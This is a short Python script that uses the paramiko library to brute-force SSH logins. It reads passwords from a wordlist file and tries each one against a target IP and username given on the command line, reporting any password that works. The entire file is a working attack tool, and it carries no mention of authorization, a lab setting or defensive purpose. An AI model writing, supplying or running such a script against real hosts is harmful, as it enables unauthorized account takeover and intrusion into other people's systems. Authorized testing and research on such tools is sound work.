import paramiko
import sys

def ssh_brute_force(target_ip, username, password_list):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        password = password.strip()
        try:
            client.connect(target_ip, username=username, password=password, timeout=3)
            print(f"[+] Password found: {password}")
            client.close()
            return True
        except paramiko.AuthenticationException:
            print(f"[-] Wrong password: {password}")
        except paramiko.SSHException as e:
            print(f"[!] SSH error: {e}")
        except Exception as e:
            print(f"[!] Connection failed: {e}")
    print("[-] Password not found in list.")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 4:
        sys.exit(1)

    target = sys.argv[1]
    user = sys.argv[2]
    pass_file = sys.argv[3]

    try:
        with open(pass_file, 'r') as f:
            passwords = f.readlines()
    except FileNotFoundError:
        print(f"[!] Password list file not found: {pass_file}")
        sys.exit(1)

    ssh_brute_force(target, user, passwords)
